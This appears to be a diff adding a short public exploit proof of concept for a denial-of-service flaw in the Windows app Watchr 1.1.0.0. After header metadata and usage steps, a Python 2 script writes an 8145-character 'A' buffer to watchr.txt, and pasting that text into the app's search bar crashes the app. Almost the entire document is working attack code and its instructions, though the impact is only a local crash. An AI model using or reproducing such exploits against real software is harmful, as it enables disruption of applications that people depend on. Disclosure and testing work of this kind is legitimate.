@@ -1,0 +1,25 @@
+# Exploit Title: Watchr 1.1.0.0 - Denial of Service (PoC)
+# Date: 1/18/2018
+# Author: 0xB9
+# Twitter: @0xB9Sec
+# Contact: 0xB9[at]pm.me
+# Software Link: https://www.microsoft.com/store/productId/9PN12GNX62VZ
+# Version: 1.1.0.0
+# Tested on: Windows 10
+
+# Proof of Concept:
+# Run the python script, it will create a new file "watchr.txt"
+# Copy the text from the generated watchr.txt file to clipboard
+# Paste the text in the search bar and click search
+# App will now crash
+
+buffer = "A" * 8145
+payload = buffer
+try:
+    f=open("watchr.txt","w")
+    print "[+] Creating %s evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
